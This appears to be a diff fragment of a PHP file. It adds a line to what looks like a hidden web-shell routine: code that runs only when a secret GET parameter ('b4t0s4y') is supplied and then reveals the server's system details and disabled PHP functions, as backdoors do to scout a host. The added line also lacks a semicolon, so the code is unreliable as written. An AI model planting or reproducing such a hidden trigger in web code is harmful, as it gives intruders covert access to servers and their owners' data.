@@ -8,6 +8,7 @@
 <?php
 if(isset($_GET["b4t0s4y"]))
  {
+  echo "b4t0s4y"
   echo"<font color=#ffffff>".php_uname()."";
   print "\n";$disable_functions = @ini_get("disable_functions"); 
   echo "<br>DisablePHP=".$disable_functions; print "\n"; 
